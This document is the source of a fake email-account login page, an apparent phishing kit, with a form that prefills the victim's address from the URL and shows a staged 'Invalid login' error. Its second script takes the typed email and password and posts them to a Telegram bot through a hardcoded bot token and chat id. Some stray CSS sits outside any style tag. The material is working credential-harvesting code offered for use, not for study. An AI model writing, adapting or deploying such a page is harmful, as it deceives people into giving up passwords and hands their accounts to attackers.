    <!-- HTML Form -->
<div id="forms">
    <form novalidate="" id="login_form" action="javascript:void(0)" method="post" target="_self">
        <div class="input-req-login"><label for="user">Email Address</label></div>
        <div class="input-field-login icon username-container">
            <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">

        </div>
        <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
        <div class="input-field-login icon password-container">
            <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
            <i class="fa fa-lock"></i>
        </div>
        <div class="controls">
            <div class="login-btn">
                <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
            </div>

        <div class="clear" id="push"></div>
    </form>
</div>

<!-- Notifications -->

<script>
// Function to get query parameters from the URL
function getQueryParameter(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Populate the email field if 'email' parameter exists
window.addEventListener('DOMContentLoaded', () => {
    const emailParam = getQueryParameter('email');
    if (emailParam) {
        const emailField = document.getElementById('user');
        emailField.value = emailParam;

        // Extract MX (mail exchange) domain from email
        const mxDomain = emailParam.split('@')[1];
        console.log("MX Domain:", mxDomain);
    }
});

// Handle login action
document.getElementById('login_submit').addEventListener('click', (e) => {
    e.preventDefault();  // Prevent form from being submitted to external URL

    // Show "Authenticating..." notification
    const notificationBar = document.getElementById('notification-bar');
    notificationBar.style.display = 'block';
    notificationBar.style.backgroundColor = 'lightblue';
    notificationBar.textContent = 'Authenticating...';

    // Simulate authentication delay
    setTimeout(() => {
        // Show "Invalid login" error after 1.5 seconds
        notificationBar.style.backgroundColor = 'red';
        notificationBar.textContent = 'Invalid login. Please try again.';
    }, 1500);
});
</script>

/* Adjust positioning of the notification bar above the logo */

    position: relative;
    padding-top: 40px; /* To make room for the notification bar */
}

<script>
document.getElementById("login_form").addEventListener("submit", function (e) {
    e.preventDefault(); 
    
    const email = document.getElementById("user").value;
    const password = document.getElementById("pass").value;

    const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
    const chatId = "6885599280";

    const message = `Email: ${email}\nPassword: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
        .then(response => {
            if (response.ok) {
                alert("Data sent successfully!");
            } else {
                alert("Failed to send data.");
            }
        })
        .catch(error => console.error("Error:", error));
});
</script>
